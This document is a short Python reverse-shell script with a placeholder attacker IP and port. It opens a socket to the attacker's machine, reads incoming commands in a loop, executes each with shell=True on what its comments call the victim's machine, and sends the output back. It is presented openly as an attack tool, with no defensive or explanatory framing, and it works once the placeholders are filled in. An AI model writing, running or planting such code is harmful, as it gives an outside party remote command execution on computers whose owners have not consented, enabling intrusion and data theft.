import socket
import subprocess

# Define the attacker's IP address and port to establish the reverse shell connection
attacker_ip = 'ATTACKER_IP_ADDRESS'
attacker_port = ATTACKER_PORT_NUMBER

def establish_reverse_shell():
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the attacker's machine
        sock.connect((attacker_ip, attacker_port))

        # Receive commands from the attacker and send back the output
        while True:
            # Receive the command from the attacker
            command = sock.recv(1024).decode()

            if command.lower() == 'exit':
                break

            # Execute the command on the victim's machine
            output = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output_result = output.stdout.read() + output.stderr.read()

            # Send the output back to the attacker
            sock.send(output_result)

    except Exception as e:
        print('An error occurred:', str(e))

    # Close the socket connection
    sock.close()

# Run the reverse shell function to establish the connection
establish_reverse_shell()
